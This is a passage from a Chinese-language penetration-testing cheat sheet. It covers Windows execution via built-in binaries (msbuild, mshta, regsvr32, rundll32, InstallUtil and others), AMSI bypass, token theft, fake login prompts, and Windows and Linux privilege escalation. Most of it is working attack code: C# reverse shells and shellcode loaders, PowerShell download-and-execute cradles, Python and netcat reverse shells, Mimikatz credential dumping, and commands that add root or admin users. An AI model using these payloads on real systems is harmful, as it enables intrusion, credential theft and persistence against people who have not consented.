<d2p1:checkTypes>false</d2p1:checkTypes>
<d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
<d2p1:compilerOptions i:nil="true" />
<d2p1:generateCCU>false</d2p1:generateCCU>
<d2p1:languageToUse>CSharp</d2p1:languageToUse>
<d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
<d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
<d2p1:mtInfo i:nil="true"/>
<d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
</parameters>
</CompilerInput>
```

##### 1.TCP  1tcp)

```
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Workflow.Activities; 
public class Program : SequentialWorkflowActivity
{
static StreamWriter streamWriter; 
public Program()
{
using(TcpClient client = new TcpClient("192.168.0.107", 12138))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream); 
StringBuilder strInput = new StringBuilder(); 
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine(); 
while(true)
{
strInput.Append(rdr.ReadLine());
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
} 
private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder(); 
if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
} 
}
>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp
>C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe 1.xml 1.cs
```

![image](http://159.75.51.84:8000/img/130.png)

```
using System.Workflow.Activities;
using System.Net; 
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
class yrDaTlg : SequentialWorkflowActivity {
[DllImport("kernel32")] private static extern IntPtr VirtualAlloc(UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr DStOGXQMMkP, uint CzzIpcuQppQSTBJ, uint JCFImGhkRqtwANx, out uint exgVpSg);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, ref UInt32 SZtdSB);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM);
public yrDaTlg() {
byte[] QWKpWKhcs =
{SHELLCODE
};
IntPtr AmnGaO = VirtualAlloc(0, (UInt32)QWKpWKhcs.Length, 0x3000, 0x04);
Marshal.Copy(QWKpWKhcs, 0, (IntPtr)(AmnGaO), QWKpWKhcs.Length);
IntPtr oXmoNUYvivZlXj = IntPtr.Zero; UInt32 XVXTOi = 0; IntPtr pAeCTfwBS = IntPtr.Zero;
uint BnhanUiUJaetgy;
bool iSdNUQK = VirtualProtect(AmnGaO, (uint)0x1000, (uint)0x20, out BnhanUiUJaetgy);
oXmoNUYvivZlXj = CreateThread(0, 0, AmnGaO, pAeCTfwBS, 0, ref XVXTOi);
WaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);}
}
```

#### Csc  csc)

```
>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp
>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\Users\y\Desktop\shell.exe /platform:x64 /unsafe C:\Users\y\Desktop\shell.cs
>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\shell.exe
using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices; 
public class Program
{
public static void Main()
{
}
}
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
public override void Uninstall(System.Collections.IDictionary savedState)
{
Shellcode.Exec();
}
}
public class Shellcode
{
public static void Exec()
{
byte[] shellcode = new byte[510] {
 SHELLCODE
};
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
}
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport("kernel32")]
private static extern bool VirtualFree(IntPtr lpAddress,
UInt32 dwSize, UInt32 dwFreeType);
[DllImport("kernel32")]
private static extern IntPtr CreateThread(
UInt32 lpThreadAttributes,
UInt32 dwStackSize,
UInt32 lpStartAddress,
IntPtr param,
UInt32 dwCreationFlags,
ref UInt32 lpThreadId
);
[DllImport("kernel32")]
private static extern bool CloseHandle(IntPtr handle);
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(
IntPtr hHandle,
UInt32 dwMilliseconds
);
[DllImport("kernel32")]
private static extern IntPtr GetModuleHandle(
string moduleName
);
[DllImport("kernel32")]
private static extern UInt32 GetProcAddress(
IntPtr hModule,
string procName
);
[DllImport("kernel32")]
private static extern UInt32 LoadLibrary(
string lpFileName
);
[DllImport("kernel32")]
private static extern UInt32 GetLastError();
}
```

#### Regasm  regasm)

```
>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\Users\y\Desktop\dll.dll  /unsafe C:\Users\y\Desktop\dll.cs
>C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /u dll.dll
namespace HYlDKsYF
 {
     public class kxKhdVzWQXolmmF : ServicedComponent {
         public kxKhdVzWQXolmmF() { Console.WriteLine("doge"); }
         [ComRegisterFunction]
         public static void RegisterClass ( string pNNHrTZzW )
         {
             ZApOAKJKY.QYJOTklTwn();
             }
             [ComUnregisterFunction]
             public static void UnRegisterClass ( string pNNHrTZzW )
             {
                 ZApOAKJKY.QYJOTklTwn();
                 }
                 }
                 public class ZApOAKJKY  { [DllImport("kernel32")] private static extern UInt32 HeapCreate(UInt32 FJyyNB, UInt32 fwtsYaiizj, UInt32 dHJhaXQiaqW);
                 [DllImport("kernel32")] private static extern UInt32 HeapAlloc(UInt32 bqtaDNfVCzVox, UInt32 hjDFdZuT, UInt32 JAVAYBFdojxsgo);
                 [DllImport("kernel32")] private static extern UInt32 RtlMoveMemory(UInt32 AQdEyOhn, byte[] wknmfaRmoElGo, UInt32 yRXPRezIkcorSOo);
                 [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 uQgiOlrrBaR, UInt32 BxkWKqEKnp, UInt32 lelfRubuprxr, IntPtr qPzVKjdiF,UInt32 kNXJcS, ref UInt32 atiLJcRPnhfyGvp);
                 [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr XSjyzoKzGmuIOcD, UInt32 VumUGj);static byte[] HMSjEXjuIzkkmo(string aCWWUttzmy,int iJGvqiEDGLhjr) {
                     IPEndPoint YUXVAnzAurxH = new IPEndPoint(IPAddress.Parse(aCWWUttzmy),iJGvqiEDGLhjr);
                     Socket MXCEuiuRIWgOYze = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     try { MXCEuiuRIWgOYze.Connect(YUXVAnzAurxH); }
                     catch { return null;}
                     byte[] Bjpvhc = new byte[4];
                     MXCEuiuRIWgOYze.Receive(Bjpvhc,4,0);
int IETFBI = BitConverter.ToInt32(Bjpvhc,0);
byte[] ZKSAAFwxgSDnTW = new byte[IETFBI +5];
int JFPJLlk =0;
while(JFPJLlk < IETFBI)
{ JFPJLlk += MXCEuiuRIWgOYze.Receive(ZKSAAFwxgSDnTW, JFPJLlk +5,(IETFBI - JFPJLlk)<4096 ? (IETFBI - JFPJLlk) : 4096,0);}
byte[] nXRztzNVwPavq = BitConverter.GetBytes((int)MXCEuiuRIWgOYze.Handle);
Array.Copy(nXRztzNVwPavq,0, ZKSAAFwxgSDnTW,1,4); ZKSAAFwxgSDnTW[0]=0xBF;
return ZKSAAFwxgSDnTW;}
static void TOdKEwPYRUgJly(byte[] KNCtlJWAmlqJ) {
    if(KNCtlJWAmlqJ !=null) {
        UInt32 uuKxFZFwog = HeapCreate(0x00040000,(UInt32)KNCtlJWAmlqJ.Length,0);
    UInt32 sDPjIMhJIOAlwn = HeapAlloc(uuKxFZFwog,0x00000008,(UInt32)KNCtlJWAmlqJ.Length);
    RtlMoveMemory(sDPjIMhJIOAlwn, KNCtlJWAmlqJ,(UInt32)KNCtlJWAmlqJ.Length);
    UInt32 ijifOEfllRl =0;
    IntPtr ihXuoEirmz = CreateThread(0,0, sDPjIMhJIOAlwn, IntPtr.Zero,0, ref ijifOEfllRl);
    WaitForSingleObject(ihXuoEirmz,0xFFFFFFFF);}}

    public static void QYJOTklTwn() {
        byte[] ZKSAAFwxgSDnTW =null; ZKSAAFwxgSDnTW = HMSjEXjuIzkkmo("192.168.0.107",12138);
        TOdKEwPYRUgJly(ZKSAAFwxgSDnTW);
        } } }
```

#### Msbuild  msbuild)

```
https://gitee.com/RichChigga/msbuild-exec
MSF监听
>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 1.xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="iJEKHyTEjyCU">
<xUokfh />
</Target>
<UsingTask
TaskName="xUokfh"
TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
<Task>
<Code Type="Class" Language="cs">
<![CDATA[
using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;
using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
public class xUokfh : Task, ITask {
[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 ogephG,UInt32 fZZrvQ, UInt32 nDfrBaiPvDyeP, UInt32 LWITkrW);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 qEVoJxknom, UInt32 gZyJBJWYQsnXkWe, UInt32 jyIPELfKQYEVZM,IntPtr adztSLHGJiurGO, UInt32 vjSCprCJ, ref UInt32 KbPukprMQXUp);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr wVCIQGmqjONiM, UInt32 DFgVrE);
static byte[] VYcZlUehuq(string IJBRrBqhigjGAx, int XBUCexXIrGIEpe) {
IPEndPoint DRHsPzS = new IPEndPoint(IPAddress.Parse(IJBRrBqhigjGAx),XBUCexXIrGIEpe);
Socket zCoDOd = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
try { zCoDOd.Connect(DRHsPzS); }
catch { return null;}
byte[] OCrGofbbWRVsFEl = new byte[4];
zCoDOd.Receive(OCrGofbbWRVsFEl, 4, 0);
int auQJTjyxYw = BitConverter.ToInt32(OCrGofbbWRVsFEl, 0);
byte[] MlhacMDOKUAfvMX = new byte[auQJTjyxYw + 5];
int GFtbdD = 0;
while (GFtbdD < auQJTjyxYw)
{ GFtbdD += zCoDOd.Receive(MlhacMDOKUAfvMX, GFtbdD + 5, (auQJTjyxYw -GFtbdD) < 4096 ? (auQJTjyxYw - GFtbdD) : 4096, 0);}
byte[] YqBRpsmDUT = BitConverter.GetBytes((int)zCoDOd.Handle);
Array.Copy(YqBRpsmDUT, 0, MlhacMDOKUAfvMX, 1, 4); MlhacMDOKUAfvMX[0]= 0xBF;
return MlhacMDOKUAfvMX;}
static void NkoqFHncrcX(byte[] qLAvbAtan) {
if (qLAvbAtan != null) {
UInt32 jrYMBRkOAnqTqx = VirtualAlloc(0, (UInt32)qLAvbAtan.Length, 0x1000, 0x40);
Marshal.Copy(qLAvbAtan, 0, (IntPtr)(jrYMBRkOAnqTqx),qLAvbAtan.Length);
IntPtr WCUZoviZi = IntPtr.Zero;
UInt32 JhtJOypMKo = 0;
IntPtr UxebOmhhPw = IntPtr.Zero;
WCUZoviZi = CreateThread(0, 0, jrYMBRkOAnqTqx, UxebOmhhPw, 0, ref JhtJOypMKo);
WaitForSingleObject(WCUZoviZi, 0xFFFFFFFF); }}
public override bool Execute()
{
byte[] uABVbNXmhr = null; uABVbNXmhr = VYcZlUehuq("192.168.0.107",12138);
NkoqFHncrcX(uABVbNXmhr);
return true; } }
]]>
</Code>
</Task>
</UsingTask>
</Project>
```

#### Winrm  winrm)

```
MSF监听
```

![image](http://159.75.51.84:8000/img/131.png)

```
>mkdir winrm
>copy c:\Windows\System32\cscript.exe winrm
创建文件WsmPty.xsl复制payload进去
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
 var r = new ActiveXObject("WScript.Shell").Run("cmd");
 ]]> </ms:script>
</stylesheet>
```

![image](http://159.75.51.84:8000/img/132.png)

```
执行
>cscript.exe //nologo C:\Windows\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
```

![image](http://159.75.51.84:8000/img/133.png)

#### Mshta  mshta)

```
>use exploit/windows/misc/hta_server
>set srvhost 192.168.0.107
>mshta http://192.168.0.107:8080/RgNeCv.hta
```

![image](http://159.75.51.84:8000/img/134.png)

```
执行vb
    >mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close)
Js
    >mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
Jsrat
    >mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
```

#### Regsvr32  regsvr32)

```
上线Empire
>usestager windows/launcher_sct
生成sct文件放入web目录
>regsvr32 /s /n /u /i:http://192.168.0.107:8080/launcher.sct scrobj.dll
>cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http://192.168.0.107/test.sct
```

#### Rundll32  rundll32)

##### 执行文件  _7)

```
>rundll32 url.dll, OpenURL file://c:\windows\system32\calc.exe
>rundll32 url.dll, OpenURLA file://c:\windows\system32\calc.exe
>rundll32 url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
>rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
>rundll32 url.dll, FileProtocolHandler calc.exe
```

##### 无弹窗执行  _8)

```
>rundll32 javascript:"\..\mshtml,RunHTMLApplication ";new%20ActiveXObject("WScript.Shell").Run("C:/Windows/System32/mshta.exe http://192.168.0.107:8080/SU8Fd6kNRz0.hta",0,true);self.close();
```

##### 增删注册表  _9)

```
保存为.inf文件
>rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf
[Version]
Signature="$WINDOWS NT$"
[DefaultInstall]
AddReg=AddReg
DelReg=DelReg
[AddReg] #删除DelReg删掉红色部分执行
HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,SYSTEM,0x00000000,c:/windows/temp/sv.exe
0x00010001表示REG_DWORD数据类型，0x00000000或省略该项(保留逗号)表示REG_SZ(字符串)
```

##### 写文件  _10)

```
>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";fso=new%20ActiveXObject("Scripting.FileSystemObject");a=fso.CreateTextFile("c:\\Temp\\testfile.txt",true);a.WriteLine("Test");a.Close();self.close();
```

##### OUT-RUNDLLCOMMAND  out-rundllcommand)

```
使用nishang脚本Out-RundllCommand生成rundll代码
>powershell -nop -w h -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Execution/Out-RundllCommand.ps1'); Out-RundllCommand -Reverse -IPAddress 192.168.0.107 -Port 12345"
```

![image](http://159.75.51.84:8000/img/135.png) ![image](http://159.75.51.84:8000/img/136.png)

```
注：低版本powershell，隐藏窗口只识别-w hidden，高版本可以-w h
执行远程PS脚本
>Out-RundllCommand -PayloadURL http://192.168.0.107/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.0.107 -Port 12138"
上线MSF
生成psh-reflection格式脚本
>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();r=new%20ActiveXObject("WScript.Shell").run("powershell -w hidden -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('http://192.168.0.107/xx.ps1'));",0,true);
```

#### DotNetToJScript  dotnettojscript)

```
通过js/vbs执行.net程序
https://github.com/tyranid/DotNetToJScript/releases
>DotNetToJScript.exe -o 1.js ExampleAssembly.dll 生成js
>DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dll生成vbs
>DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll 生成vba
>DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dll生成sct
```

##### STARFIGHTERS  starfighters)

```
https://github.com/Cn33liz/StarFighters 可以执行powershell代码，详见
执行单条命令
$code = 'start calc.exe'
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded
复制为var EncodedPayload的值
远程执行mimikatz
powershell IEX "(New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'log privilege::debug sekurlsa::logonpasswords'"
以上保存在code.txt
$code = Get-Content -Path code.txt
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded | Out-File 2.txt
```

![image](http://159.75.51.84:8000/img/137.png)

```
生成的2.txt文件内容替换为var EncodedPayload的值再执行
```

![image](http://159.75.51.84:8000/img/138.png) ![image](http://159.75.51.84:8000/img/139.png)

##### 绕过AMSI执行  amsi)

```
>copy c:\windows\system32\cscript.exe amsi.dll
>amsi.dll evil.js
```

#### WMIC  wmic)

```
Empire建立监听，生成windows/launcher_xsl模块的xsl文件保存在web目录
>wmic process get brief /format:http://192.168.0.107:8080/launcher.xsl
也可结合mshta使用
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("mshta http://192.168.0.107:8080/RgNeCv.hta");
    ]]> </ms:script>
</stylesheet>
```

#### Msxsl  msxsl)

```
下载
https://www.microsoft.com/en-us/download/details.aspx?id=21714
远程执行shellcode
https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml
>msxls.exe http://192.168.0.107/shellcode.xml http://192.168.0.107/shellcode.xml
Empire生成shellcode贴到脚本中EncodedPayload位置
```

![image](http://159.75.51.84:8000/img/140.png)

#### CPL  cpl)

```
Kali监听
```

![image](http://159.75.51.84:8000/img/141.png)

```
编译成DLL
```

![image](http://159.75.51.84:8000/img/142.png)

```
Control执行
>control C:\Users\Administrator.DC\Desktop\VC6.0green\MyProjects\dll\Debug\dll.dll
```

![image](http://159.75.51.84:8000/img/143.png)

```
或将DLL后缀改为cpl，双击执行，或rundll32执行
>rundll32.exe shell32.dll,Control_RunDLL C:\Users\Administrator.DC\Desktop\VC6.0green\MyProjects\dll\Debug\dll.dll
```

### Runas  runas)

```
#use exploit/windows/local/ask
```

### 令牌窃取  _11)

#### MSF  msf_2)

```
Meterpreter>use incognito
Meterpreter>list_tokens -u
Meterpreter>impersonate_token name\\administrator
&
Meterpreter>ps
Meterpreter>steal_token pid
```

#### Cobalt strike  cobalt-strike)

```
beacon> steal_token 1234 窃取令牌
beacon> rev2self 恢复令牌
Windows
https://gitee.com/RichChigga/incognito2
```

### 密码窃取  _12)

#### 伪造锁屏  _13)

```
https://github.com/Pickfordmatt/SharpLocker/releases
```

![image](http://159.75.51.84:8000/img/144.png)

```
https://github.com/bitsadmin/fakelogonscreen/releases
```

![image](http://159.75.51.84:8000/img/145.png)

```
记录的密码保存在
%LOCALAPPDATA%\Microsoft\user.db
```

![image](http://159.75.51.84:8000/img/146.png)

#### 伪造认证框  _14)

##### CREDSLEAKER  credsleaker)

```
https://github.com/Dviros/CredsLeaker
将cl_reader.php，config.php，config.cl上传到web服务器
修改CredsLeaker.ps1、run.bat中URL参数
```

![image](http://159.75.51.84:8000/img/147.png)

```
输入正确密码后会自动结束，否则除非结束powershell进程才可结束
获取到正确密码后会在目录下生成creds.txt保存密码信息
```

![image](http://159.75.51.84:8000/img/148.png)

##### LOGINPROMPT  loginprompt)

```
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/Invoke-LoginPrompt.ps1');invoke-LoginPrompt"
```

![image](http://159.75.51.84:8000/img/149.png)

```
除非结束进程，否则只能输对密码才能关闭对话框。
收到正确密码会返回结果
```

![image](http://159.75.51.84:8000/img/150.png)

##### NISHANG-INVOKE-CREDENTIALSPHISH  nishang-invoke-credentialsphish)

```
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.108/ps/nishang/Gather/Invoke-CredentialsPhish.ps1'); Invoke-CredentialsPhish"
```

![image](http://159.75.51.84:8000/img/151.png) ![image](http://159.75.51.84:8000/img/152.png)

### RottenPotato  rottenpotato)

```
https://github.com/foxglovesec/RottenPotato Meterpreter>use incognito
Meterpreter>list_tokens -u
Meterpreter>upload /root/Desktop/rottenpotato.exe
Meterpreter>execute -HC -f rottenpotato.exe
Meterpreter>impersonate_token "NT AUTHORITY\\SYSTEM"
```

### PowerUp  powerup)

```
检测有漏洞的服务
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1');Invoke-AllChecks"
```

![image](http://159.75.51.84:8000/img/153.png)

```
>icacls C:\Windows\system32\\wlbsctrl.dll 查看文件权限，F为完全控制，M修改
```

![image](http://159.75.51.84:8000/img/154.png)

```
在AbuseFunction中会显示利用语句。
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1'); Write-HijackDll -OutputFile 'C:\Windows\system32\\wlbsctrl.dll' -Command 'net user admin pass@Qwe1 /add&net localgroup administrators admin /add'"
```

![image](http://159.75.51.84:8000/img/155.png)

```
重启电脑后会新增用户admin
```

![image](http://159.75.51.84:8000/img/156.png)

```
查找可能劫持的进程
>Find-ProcessDLLHijack
查找环境变量中当前用户可修改的目录
>Find-PathDLLHijack
查找存在注册表中自动登录用户的平局
>Get-RegistryAutoLogon
查询trusted_service_path
>Get-ServiceUnquoted
查询当前用户可修改的注册表开机启动项
>Get-ModifiableRegistryAutoRun
查询当前用户可修改的计划任务项
>Get-ModifiableScheduledTaskFile
查询系统中所有web.config文件中的明文密码
>Get-WebConfig
```

### Powerup-AlwaysInstallElevated  powerup-alwaysinstallelevated)

```
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1');Get-RegAlwaysInstallElevated"
```

![image](http://159.75.51.84:8000/img/157.png)

```
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1'); Write-UserAddMSI"
普通用户执行安装
```

![image](http://159.75.51.84:8000/img/158.png) ![image](http://159.75.51.84:8000/img/159.png)

### AlwaysInstallElevated提权  alwaysinstallelevated)

```
>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
为1 检测是否永远以高权限启动安装
#HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
新建DWORD32 DisableMSI=0
#msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi
#upload /root/add.msi c:\\1.msi
>msiexec /quiet /qn /i c:\1.msi
MSF
#use exploit/windows/local/always_install_elevated
#set session 1
```

### Trusted Service Paths  trusted-service-paths)

```
>wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """ 列出没有用引    号包含的服务
#use exploit/windows/local/trusted_service_path
#set session 1
```

### Vulnerable Services  vulnerable-services)

```
#use exploit/windows/local/service_permissions
#set session 1
```

### Sudo提权  sudo)

```
/home/user/.sudo_as_admin_successful
>sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
>sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
>sudo strace –o /dev/null /bin/bash
>sudo nmap –interactive nmap>!sh
>echo "os.execute('/bin.sh')">/tmp/1.nse
>sudo nmap –script=/tmp/shell.nse 
>sudo more/less/man /etc/rsyslog.conf
>sudo git help status 
>!/bin/bash
>sudo ftp
>!/bin/bash
>sudo vim -c '!sh'
>sudo find /bin/ -name ls -exec /bin/bash ;
>sudo awk 'BEGIN {system("/bin/sh")}'
```

### Linux计划任务  linux)

```
>for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done 列举所有用户的crontab
$cat /etc/crontab
$echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' >test.sh
$echo "" > "--checkpoint-action=exec=sh test.sh"
$echo "" > --checkpoint=1
或编辑可写的计划任务文件
#!/usr/bin/python
import os,subprocess,socket
s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.107","5555"))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Linux SUID提权  linux-suid)

```
查找有root权限的SUID文件
$find / -perm -u=s -type f 2>/dev/null
$find / -user root -perm -4000 -print 2>/dev/null
$find / -user root -perm -4000 -exec ls -ldb {} \;
```

#### Find  find)

```
$touch xxx
$/usr/bin/find xxx –exec whoami \;
$/usr/bin/find xxx –exec python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  \;
&
>find xxx -exec netcat -lvp 12138 -e /bin/sh \; 然后攻击机主动连接
```

#### NMAP  nmap)

```
# 进入nmap的交互模式
>nmap --interactive 
>!sh
```

#### VIM  vim)

```
>vim.tiny /etc/shadow
&
>vim.tiny
# 按ESC
:set shell=/bin/sh
:shell
```

#### BASH  bash)

```
>bash –p
```

#### More/Less/Man  morelessman)

```
>less /etc/passwd
!/bin/sh
>more /etc/passwd
!/bin/bash
>man passwd
!/bin/bash
```

#### CP/MV  cpmv)

```
覆盖shadow文件
```

### Linux /etc/passwd提权  linux-etcpasswd)

```
$ls –lh /etc/passwd 若是任何用户可读写
$perl -le 'print crypt("password@123","addedsalt")' 生成密码
$echo "test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash" >>/etc/passwd
一条命令添加root用户
#useradd -p `openssl passwd -1 -salt 'user' 123qwe` -u 0 -o -g root  -G root -s /bin/bash -d /home/user venus
用户名venus 密码123qwe
#useradd newuser;echo "newuser:password"|chpasswd
>echo "admin:x:0:0::/:/bin/sh" >> /etc/passwd
>passwd admin修改密码
```

### Linux脏牛提权  linux_1)

```
https://github.com/FireFart/dirtycow
$gcc -pthread dirty.c -o dirty –lcrypt
$./dirty passwd 
生成账户密码
https://github.com/gbonacini/CVE-2016-5195
$make
$./dcow -s
```

## RDP&Fireawall  rdpfireawall)

### 爆破  _15)

```
Hydra爆破RDP
>hydra -l admin -P /root/Desktop/passwords -S 192.168.0.0 rdp
&
Nlbrute
```

![image](http://159.75.51.84:8000/img/160.png)

### 注册表开启  _16)

```
查询系统是否允许3389远程连接：
